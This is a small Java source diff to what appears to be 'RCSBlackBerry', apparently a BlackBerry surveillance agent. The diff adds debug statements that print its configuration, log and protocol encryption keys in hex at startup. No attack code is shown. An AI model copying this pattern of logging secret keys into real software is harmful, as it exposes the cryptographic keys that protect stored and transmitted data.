@@ -19,6 +19,7 @@ import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.utils.Utils;
 
 /**
  * The Class Main.
@@ -95,6 +96,9 @@ public class Main extends UiApplication {
         debug.info("RCSBlackBerry " + Version.VERSION);
         debug.info("Message encryption: " + Messages.getString("1.0"));
         debug.info("BuildID " + new String(Keys.getInstance().getBuildID()));
+        debug.info("Key Conf " + Utils.byteArrayToHex(Keys.getInstance().getConfKey()));
+        debug.info("Key Log " + Utils.byteArrayToHex(Keys.getInstance().getLogKey()));
+        debug.info("Key Proto" + Utils.byteArrayToHex(Keys.getInstance().getProtoKey()));
         //#endif
 
         final Thread coreThread = new Thread(core);
